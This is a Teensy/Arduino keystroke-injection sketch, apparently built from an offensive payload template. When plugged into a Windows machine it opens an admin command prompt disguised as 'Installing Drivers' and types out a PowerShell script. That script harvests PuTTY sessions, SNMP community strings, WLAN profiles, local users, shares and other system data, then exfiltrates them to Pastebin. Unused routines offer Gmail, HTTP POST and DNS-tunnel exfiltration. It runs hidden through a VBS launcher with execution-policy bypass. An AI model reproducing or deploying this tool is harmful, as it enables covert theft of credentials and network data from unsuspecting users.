#define TEENSY3
#ifdef TEENSY2
    #include<usb_private.h>
#endif



void setup(){
  delay(3000);
  wait_for_drivers(2000);

  minimise_windows();
  delay(500);
  while(!cmd_admin(3,500))
  {
  reset_windows_desktop(2000);
  }

  Keyboard.println("echo $pn = $env:COMPUTERNAME + \"  Info\" > %temp%\\in.ps1");
  Keyboard.println("echo $user = \"&;!@#$%^&*()_\" >> %temp%\\in.ps1");
  Keyboard.println("echo $pass = \"!@#$%^&*()_:"/\" >> %temp%\\in.ps1");
  Keyboard.println("echo $dev = \"1234567890\" >> %temp%\\in.ps1");
  delay(1000);
  Keyboard.println("echo function regv($rk, $rg,$ch) >> %temp%\\in.ps1");
  Keyboard.println("echo { >> %temp%\\in.ps1");
  Keyboard.println("echo if ($ch -eq \"no\"){$key = get-item $rk} >> %temp%\\in.ps1");
  Keyboard.println("echo else{$key = ls $rk} >> %temp%\\in.ps1");
  Keyboard.println("echo $key ^| >> %temp%\\in.ps1");
  Keyboard.println("echo ForEach-Object { >> %temp%\\in.ps1");
  Keyboard.println("echo $v = gp $_.PSPath >> %temp%\\in.ps1");
  Keyboard.println("echo ForEach ($value in $_.Property) >> %temp%\\in.ps1");
  Keyboard.println("echo { >> %temp%\\in.ps1");
  Keyboard.println("echo if ($rg -eq \"all\") {$v.$value} >> %temp%\\in.ps1");
  Keyboard.println("echo elseif ($rg -eq \"allname\"){$value} >> %temp%\\in.ps1");
  Keyboard.println("echo else {$v.$rg;break} >> %temp%\\in.ps1");
  Keyboard.println("echo }}} >> %temp%\\in.ps1");

  Keyboard.println("echo $o = \"Logged in users:`n\" + (regv \"hklm:\\software\\microsoft\\windows nt\\currentversion\\profilelist\" \"profileimagepath\") >> %temp%\\in.ps1");
  Keyboard.println("echo $o = $o + \"`n PS Env:`n\" + (regv \"hklm:\\software\\microsoft\\powershell\1\" \"allname\") >> %temp%\\in.ps1");
  Keyboard.println("echo $o = $o + \"`n Putty trusted hosts:`n\" + (regv \"hkcu:\\software\\simontatham\\putty\" \"allname\") >> %temp%\\in.ps1");
  Keyboard.println("echo $o = $o + \"`n Putty saved sessions:`n\" + (regv \"hkcu:\\software\\simontatham\\putty\\sessions\" \"all\") >> %temp%\\in.ps1");
  Keyboard.println("echo $o = $o + \"`n Shares:`n\" + (regv \"hklm:\\SYSTEM\\CurrentControlSet\\services\\LanmanServer\\Shares\" \"all\" \"no\") >> %temp%\\in.ps1");
  Keyboard.println("echo $o = $o + \"`n Env vars:`n\" + (regv \"hklm:\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Environment\" \"all\" \"no\") >> %temp%\\in.ps1");
  Keyboard.println("echo $o = $o + \"`n Current user:`n\" + (regv \"hkcu:\\Volatile Environment\" \"all\" \"no\") >> %temp%\\in.ps1");
  Keyboard.println("echo $o = $o + \"`n SNMP cs:`n\" + (regv \"hklm:\\SYSTEM\\CurrentControlSet\\services\\snmp\\parameters\\validcommunities\" \"all\" \"no\") >> %temp%\\in.ps1");
  Keyboard.println("echo $o = $o + \"`n SNMP cs - user:`n\" + (regv \"hkcu:\\SYSTEM\\CurrentControlSet\\services\\snmp\\parameters\\validcommunities\" \"all\" \"no\") >> %temp%\\in.ps1");
  Keyboard.println("echo $o = $o + \"`n Installed Apps:`n\" + (regv \"hklm:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\" \"displayname\") >> %temp%\\in.ps1");
  Keyboard.println("echo $o = $o + \"`n Installed Apps - user:`n\" + (regv \"hkcu:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\" \"displayname\") >> %temp%\\in.ps1");
  Keyboard.println("echo $o = $o + \"`n Domain:`n\" + (regv \"hklm:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Group Policy\\History\\\" \"all\" \"no\") >> %temp%\\in.ps1");

  Keyboard.println("echo $o = $o + \"`n Contents of /etc/hosts:`n\" + (gc -path \"C:\\windows\\System32\\drivers\\etc\\hosts\") >> %temp%\\in.ps1");

  Keyboard.println("echo $o = $o + \"`n Running Services:`n\" + (net start) >> %temp%\\in.ps1");
  Keyboard.println("echo $o = $o + \"`n Account Policy:`n\" + (net accounts) >> %temp%\\in.ps1");
  Keyboard.println("echo $o = $o + \"`n Local users:`n\" + (net user) >> %temp%\\in.ps1");
  Keyboard.println("echo $o = $o + \"`n Local Groups:`n\" + (net localgroup) >> %temp%\\in.ps1");
  Keyboard.println("echo $o = $o + \"`n WLAN Info:`n\" + (netsh wlan show all) >> %temp%\\in.ps1");

  Keyboard.println("echo $o = $o.Replace(\"/\",\"\\\") >> %temp%\\in.ps1");
  Keyboard.println("echo $pv = $o.Replace(\"www\",\"uuu\") >> %temp%\\in.ps1");

  String fn = "in";
  String fp;
   if ("pastebin" == "pastebin")
  {
    pastebin(fn);
  }
  else if ("pastebin" == "gmail")
  {
    if (fp != "")
    {
        gmail(fn,fp);
    }
    else
    {
        gmail(fn,"no");
    }
  }
  else if ("pastebin" == "post")
  {
    hpost(fn);
  }
  else if ("pastebin" == "dns")
  {
    dns(fn);
  }


  Keyboard.println("echo Set oShell = CreateObject(\"WScript.Shell\") > %temp%\\in.vbs");
  Keyboard.println("echo oShell.Run(\"powershell.exe -ep bypass -nologo -c %temp%\\in.ps1\"),0,true >> %temp%\\in.vbs");
  delay(1000);
  Keyboard.println("wscript %temp%\\in.vbs");
  delay(3000);
  Keyboard.println("exit");

}

void loop(){}
  void wait_for_drivers(int sleep)
{
bool CapsLockTrap = is_caps_on();
while(CapsLockTrap == is_caps_on())
{
Keyboard.set_key1(KEY_CAPS_LOCK);
Keyboard.send_now();
delay(200);
Keyboard.set_modifier(0);
Keyboard.set_key1(0);
Keyboard.send_now();
delay(500);
delay(sleep);
}
Keyboard.set_key1(KEY_CAPS_LOCK);
Keyboard.send_now();
delay(200);
Keyboard.set_modifier(0);
Keyboard.set_key1(0);
Keyboard.send_now();
delay(500);
delay(sleep);
}

int ledkeys(void) {return int(keyboard_leds);}

bool is_caps_on(void) {return ((ledkeys() & 2) == 2) ? true : false;}

bool cmd_admin(int reps, int millisecs)
{
make_sure_capslock_is_off();
delay(700);
Keyboard.set_modifier(MODIFIERKEY_RIGHT_GUI);
Keyboard.send_now();
Keyboard.set_modifier(0);
Keyboard.send_now();
delay(3000);
Keyboard.print("cmd /T:01 /K \"@echo off && mode con:COLS=15 LINES=1 && title Installing Drivers\"");
delay(2000);
Keyboard.set_modifier(MODIFIERKEY_CTRL);
Keyboard.send_now();
Keyboard.set_modifier(MODIFIERKEY_CTRL | MODIFIERKEY_SHIFT);
Keyboard.send_now();
Keyboard.set_key1(KEY_ENTER);
Keyboard.send_now();
delay(200);
Keyboard.set_modifier(0);
Keyboard.set_key1(0);
Keyboard.send_now();
delay(500);
delay(7000);
send_left_enter();
delay(4000);
create_click_capslock_win();
check_for_capslock_success_teensy(reps,millisecs);
}

bool cmd(int reps, int millisecs, char *SomeCommand)
{
make_sure_capslock_is_off();
delay(700);
Keyboard.set_modifier(MODIFIERKEY_RIGHT_GUI);
Keyboard.set_key1(KEY_R);
Keyboard.send_now();

delay(500);
Keyboard.set_modifier(0);
Keyboard.set_key1(0);
Keyboard.send_now();

Keyboard.print(SomeCommand);
Keyboard.set_key1(KEY_ENTER);
Keyboard.send_now();

Keyboard.set_key1(0);
Keyboard.send_now();

delay(3000);
create_click_capslock_win();
check_for_capslock_success_teensy(reps,millisecs);
}

void make_sure_capslock_is_off(void)
{
if (is_caps_on())
{
delay(500);
Keyboard.set_key1(KEY_CAPS_LOCK);
Keyboard.send_now();
delay(200);
delay(700);
Keyboard.set_modifier(0);
Keyboard.set_key1(0);
Keyboard.send_now();
delay(500);
delay(700);
}
}

void create_click_capslock_win()
{
Keyboard.println("echo Set WshShell = WScript.CreateObject(\"WScript.Shell\"): WshShell.SendKeys \"{CAPSLOCK}\" > %temp%\\capslock.vbs");
delay(400);
Keyboard.println("wscript %temp%\\capslock.vbs");
delay(2000);
}

bool check_for_capslock_success_teensy(int reps, int millisecs)
{
unsigned int i = 0;
do
{
delay(millisecs);
if (is_caps_on())
{
make_sure_capslock_is_off();
delay(700);
return true;
}
i++;
}
while (!is_caps_on() && (i<reps));
return false;
}

void minimise_windows(void)
{
Keyboard.set_modifier(MODIFIERKEY_RIGHT_GUI);
Keyboard.set_key1(KEY_M);
Keyboard.send_now();
delay(300);
Keyboard.set_modifier(0);
Keyboard.set_key1(0);
Keyboard.send_now();
delay(500);
delay(300);
}

void reset_windows_desktop(int sleep)
{
delay(1000);
minimise_windows();
delay(sleep);
minimise_windows();
delay(sleep);
minimise_windows();
delay(200);
}

void send_left_enter(){
  delay(1000);
  Keyboard.set_key1(KEY_LEFT);
  Keyboard.send_now();
  delay(100);
  Keyboard.set_key1(0);
  Keyboard.send_now();

  Keyboard.set_key1(KEY_ENTER);
  Keyboard.send_now();
  delay(100);
  Keyboard.set_key1(0);
  Keyboard.send_now();
  }


  void post(String filename)
{
    Keyboard.print("echo function pht($url,$pars) { >> %temp%\\");
    Keyboard.print(filename);
    Keyboard.println(".ps1");
    Keyboard.print("echo $ht = New-Object -ComObject Msxml2.XMLHTTP >> %temp%\\");
    Keyboard.print(filename);
    Keyboard.println(".ps1");
    Keyboard.print("echo $ht.open(\"POST\", $url, $false) >> %temp%\\");
    Keyboard.print(filename);
    Keyboard.println(".ps1");
    Keyboard.print("echo $ht.setRequestHeader(\"Content-type\",\"application/x-www-form-urlencoded\") >> %temp%\\");
    Keyboard.print(filename);
    Keyboard.println(".ps1");
    Keyboard.print("echo $ht.setRequestHeader(\"Content-length\", $pars.length); >> %temp%\\");
    Keyboard.print(filename);
    Keyboard.println(".ps1");
    Keyboard.print("echo $ht.setRequestHeader(\"Connection\", \"close\") >> %temp%\\");
    Keyboard.print(filename);
    Keyboard.println(".ps1");
    Keyboard.print("echo $ht.send($pars) >> %temp%\\");
    Keyboard.print(filename);
    Keyboard.println(".ps1");
    Keyboard.print("echo $script:sk=$ht.responseText }>> %temp%\\");
    Keyboard.print(filename);
    Keyboard.println(".ps1");
}

void compress_encode(String filename)
{
 Keyboard.print("echo $ms = New-Object IO.MemoryStream >> %temp%\\");
 Keyboard.print(filename);
 Keyboard.println(".ps1");
 Keyboard.print("echo $ac = [IO.Compression.CompressionMode]::Compress >> %temp%\\");
 Keyboard.print(filename);
 Keyboard.println(".ps1");
 Keyboard.print("echo $cs = New-Object IO.Compression.DeflateStream ($ms,$ac) >> %temp%\\");
 Keyboard.print(filename);
 Keyboard.println(".ps1");
 Keyboard.print("echo $sw = New-Object IO.StreamWriter ($cs, [Text.Encoding]::ASCII) >> %temp%\\");
 Keyboard.print(filename);
 Keyboard.println(".ps1");
 Keyboard.print("echo $pv ^| ForEach-Object {$sw.WriteLine($_)} >> %temp%\\");
 Keyboard.print(filename);
 Keyboard.println(".ps1");
 Keyboard.print("echo $sw.Close() >> %temp%\\");
 Keyboard.print(filename);
 Keyboard.println(".ps1");
 Keyboard.print("echo $code = [Convert]::ToBase64String($ms.ToArray()) >> %temp%\\");
 Keyboard.print(filename);
 Keyboard.println(".ps1");
}

void pastebin(String filename)
{
    post(filename);
    Keyboard.print("echo pht \"https://pastebin.com/api/api_login.php\" \"api_dev_key=$dev&api_user_name=$user&api_user_password=$pass\" >> %temp%\\");
    Keyboard.print(filename);
    Keyboard.println(".ps1");
    Keyboard.print("echo pht \"https://pastebin.com/api/api_post.php\" \"api_user_key=$sk&api_option=paste&api_dev_key=$dev&api_paste_name=$pn&api_paste_code=$pv&api_paste_private=2\" >> %temp%\\");
    Keyboard.print(filename);
    Keyboard.println(".ps1");
}

void gmail(String filename, String filepath)
{
    Keyboard.print("echo $srv = \"smtp.gmail.com\" >> %temp%\\");
    Keyboard.print(filename);
    Keyboard.println(".ps1");
    Keyboard.print("echo $msg = new-object Net.Mail.MailMessage >> %temp%\\");
    Keyboard.print(filename);
    Keyboard.println(".ps1");
    Keyboard.print("echo $st = new-object Net.Mail.SmtpClient($srv) >> %temp%\\");
    Keyboard.print(filename);
    Keyboard.println(".ps1");
    Keyboard.print("echo $st.EnableSsl = $True >> %temp%\\");
    Keyboard.print(filename);
    Keyboard.println(".ps1");
    Keyboard.print("echo $st.Credentials = New-Object System.Net.NetworkCredential(\"$user\", \"$pass\"); >> %temp%\\");
    Keyboard.print(filename);
    Keyboard.println(".ps1");
    Keyboard.print("echo $msg.From = \"$user@gmail.com\" >> %temp%\\");
    Keyboard.print(filename);
    Keyboard.println(".ps1");
    Keyboard.print("echo $msg.To.Add(\"$user@gmail.com\") >> %temp%\\");
    Keyboard.print(filename);
    Keyboard.println(".ps1");
    Keyboard.print("echo $msg.Subject = $pn >> %temp%\\");
    Keyboard.print(filename);
    Keyboard.println(".ps1");
    Keyboard.print("echo $msg.Body = $pv >> %temp%\\");
    Keyboard.print(filename);
    Keyboard.println(".ps1");
    if (filepath != "no"){

        Keyboard.print("echo $att = new-object Net.Mail.Attachment(\"");
        Keyboard.print (filepath);
        Keyboard.print ("\") >> %temp%\\");
        Keyboard.print(filename);
        Keyboard.println(".ps1");
        Keyboard.print("echo $msg.Attachments.Add($att) >> %temp%\\");
        Keyboard.print(filename);
        Keyboard.println(".ps1");
    }
    Keyboard.print("echo $st.Send($msg) >> %temp%\\");
    Keyboard.print(filename);
    Keyboard.println(".ps1");
}

void hpost (String filename)
{
    compress_encode(filename);
    post(filename);
    Keyboard.print("echo pht $user $code >> %temp%\\");
    Keyboard.print(filename);
    Keyboard.println(".ps1");
}

void dns (String filename)
{
    compress_encode(filename);
    Keyboard.print("echo $lstr = 0 >> %temp%\\");
    Keyboard.print(filename);
    Keyboard.println(".ps1");
    Keyboard.print("echo $qrs = [int]($code.Length/63) >> %temp%\\");
    Keyboard.print(filename);
    Keyboard.println(".ps1");
    Keyboard.print("echo while ($qrs -ne 0){ >> %temp%\\");
    Keyboard.print(filename);
    Keyboard.println(".ps1");
    Keyboard.print("echo $qs = $code.Substring($lstr,63) >> %temp%\\");
    Keyboard.print(filename);
    Keyboard.println(".ps1");
    Keyboard.print("echo Invoke-Expression \"nslookup -querytype=txt $qs.$user $pass\" >> %temp%\\");
    Keyboard.print(filename);
    Keyboard.println(".ps1");
    Keyboard.print("echo $lstr += 63 >> %temp%\\");
    Keyboard.print(filename);
    Keyboard.println(".ps1");
    Keyboard.print("echo $qrs -= 1 } >> %temp%\\");
    Keyboard.print(filename);
    Keyboard.println(".ps1");
    Keyboard.print("echo $mod = $code.Length%63 >> %temp%\\");
    Keyboard.print(filename);
    Keyboard.println(".ps1");
    Keyboard.print("echo $qr = $code.Substring($code.Length - $mod, $mod) >> %temp%\\");
    Keyboard.print(filename);
    Keyboard.println(".ps1");
    Keyboard.print("echo Invoke-Expression \"nslookup -querytype=txt $qr.$user $pass\" >> %temp%\\");
    Keyboard.print(filename);
    Keyboard.println(".ps1");
}

